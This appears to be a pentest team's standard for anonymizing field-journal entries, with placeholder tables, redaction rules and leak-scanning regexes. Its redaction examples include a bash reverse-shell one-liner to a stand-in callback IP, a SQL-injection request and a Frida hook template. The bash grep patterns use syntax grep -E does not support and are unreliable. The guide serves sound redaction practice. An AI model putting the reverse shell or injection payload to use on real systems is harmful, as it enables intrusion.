# Field-Journal Anonymization Standard

> Anonymization is **mandatory** when writing a field-journal entry, submitting a PR, sharing a payload or sending a report externally. The placeholder standard below draws on the anonymization protocol of the PentAGI multi-agent system, and the goal is: **keep the reusable value while never exposing the real target**.

## Master Placeholder Table

### Network and Hosts

| Type | Placeholder | Applies to |
|------|-------|---------|
| Target IP | `{target_ip}` | The host being tested |
| Victim IP | `{victim_ip}` | The next hop during internal lateral movement |
| Remote host | `{remote_host}` | Generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback |
| Callback domain | `{callback_domain}` | OOB / reverse shell |
| Target domain | `{target_domain}` | Web / mail target |
| Victim domain | `{victim_domain}` | Internal domain |
| Custom port | `{port}` | Non-standard port |
| Standard port | Keep the original value | Keep 80 / 443 / 22 / 445 / 3389 and similar so the notes stay reusable |

### Credentials and Keys

| Type | Placeholder |
|------|-------|
| Username | `{username}` |
| Password | `{password}` |
| Hash | `{hash}` |
| Session token | `{token}` |
| API key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer | `{bearer_token}` |

### URLs and Endpoints

| Type | Placeholder |
|------|-------|
| Generic URL | `{url}` |
| API endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload endpoint | `{upload_endpoint}` |
| Login endpoint | `{login_endpoint}` |

### Paths

| Type | Placeholder |
|------|-------|
| Install directory | `{install_dir}` |
| Configuration file | `{config_path}` |
| Web root | `{webroot}` |
| Upload directory | `{upload_dir}` |
| Log path | `{log_path}` |

### Business Identifiers

| Type | Placeholder |
|------|-------|
| Real name | `{user_name}` |
| Email | `{user_email}` |
| Phone number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order ID | `{order_id}` |
| UUID | `{uuid}` |

## What Not to Anonymize

To keep the experience reusable, **do not replace** the following:

- CVE identifiers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306 and similar)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## The Context Preservation Principle

When replacing values, **keep the semantic structure** so a reader can still tell what it is:

```python
# ❌ Replacing everything with X destroys the meaning
target = "X"
url = "X/X"

# ❌ The replacement is too generic
target = "{target}"
url = "{url}"

# ✅ Context preserved
target_ip = "{target_ip}"           # 192.168.10.50
target_url = "{target_url}/admin"   # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload Anonymization

### Web payload

```
Original:   GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
            Host: shop.victim-corp.cn
            Cookie: PHPSESSID=abcdef123456

Anonymized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
            Host: {target_domain}
            Cookie: PHPSESSID={session_id}
```

### Shell payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Anonymized
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida hook script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    ...
};

// Anonymized
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    ...
};
```

## Binary Sample Anonymization

### Hashes

Record the sha256 only, **never attach the original file**. If a sample must be shared:

- Upload it to a public sample repository such as VirusTotal or MalwareBazaar
- Link to someone else's existing analysis of the same hash

### Strings and Symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Anonymized
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot Anonymization

- Blur or black out: usernames, emails, phone numbers, order IDs, personal names
- In the URL bar, expose only the domain structure (keep the path, mask the host), or replace it entirely
- Keep only the first two octets of internal IP ranges: `10.0.x.x` rather than `10.0.10.50`
- Image elements that identify the company (logos, watermarks) must be masked

## The CTF Special Case

CTF challenge descriptions, target machine hostnames and flag formats are **usually not sensitive** (the target machines are public challenges), but:

- A privately deployed range you built yourself must be treated like a real environment
- Flags must not be published before the competition ends
- Do not copy someone else's unpublished solution straight into a field-journal entry

## Automated Detection Script

After writing a field-journal entry, run the regexes below to catch anything you forgot to redact:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Mainland China mobile numbers
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalents
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

Wrap this up as `field-journal/scripts/scan-leaks.ps1` and run it before every submission.

## The Reverse Case: Reading Someone Else's Anonymized Docs

When reading someone else's field-journal or writeup and you hit a placeholder such as `{target_ip}`, **do not substitute the real values from your own environment and then commit**; leave the placeholders as they are.

## Field-Journal Mandatory Checklist

Go through this checklist before submitting a field-journal entry:

```
□ No public IPs (other than CDNs / public services)
□ No real domains (other than demonstration domains such as example.com)
□ No real credentials / tokens / hashes (replaced with {placeholder})
□ No names / employee IDs / emails left visible in screenshots
□ No sample file itself (keep only the sha256)
□ Every JWT / OAuth code / API key replaced
□ Internal IP ranges blurred to the first two octets (10.0.x.x)
□ Target-specific parameters in payloads replaced with generic placeholders
□ Cookies and session IDs replaced
```

Append this checklist directly to the end of `field-journal/_template.md`.
